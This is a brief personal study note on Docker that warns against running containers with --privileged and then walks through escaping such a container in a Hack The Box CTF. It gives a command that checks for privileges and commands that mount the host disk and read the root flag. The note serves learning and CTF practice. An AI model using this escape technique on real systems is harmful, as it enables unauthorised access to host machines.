# Docker
Docker is a tool for virtualise computer unlike [[VMWare]] the host and the container have the OS system. 


## exploit
## privleged container

It important not to run the container with \--privileged as it leaves the machines vulnerable to exploitation allowing a hacker to gain access to the host machine. 
privileged container check 
````bash
ip link add dummy0 type dummy
````
And if a success meaning we got a priv container
allowing us to mount dir 

How to escape a container in a CTF (Hackthebox ready)
let try esacape the container. 
````Bash
mkdir /tmp/test
mount /dev/sda2 /tmp/test
cat /tmp/test/root/root.txt
````

resource: 
https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1?gi=c1a107350323